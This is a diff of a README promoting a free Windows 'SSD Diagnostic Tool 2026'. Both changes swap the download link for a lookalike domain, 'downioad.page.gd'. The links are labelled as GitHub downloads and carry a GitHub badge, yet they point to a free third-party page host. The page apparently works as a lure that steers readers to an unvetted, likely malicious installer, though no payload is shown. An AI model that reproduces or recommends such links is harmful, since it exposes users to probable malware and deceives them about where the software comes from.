@@ -2,7 +2,7 @@
 
 The **SSD Diagnostic Tool 2026** is a comprehensive, free utility designed to help you monitor the health, performance, and integrity of your Solid State Drives. This diagnostic software provides critical insights into your drive's condition, helping to prevent data loss and optimize system performance on Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -46,4 +46,4 @@ A: Yes, the SSD Diagnostic Tool 2026 is completely free for personal and diagnos
 
 You can obtain the latest version of the software from the official release page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
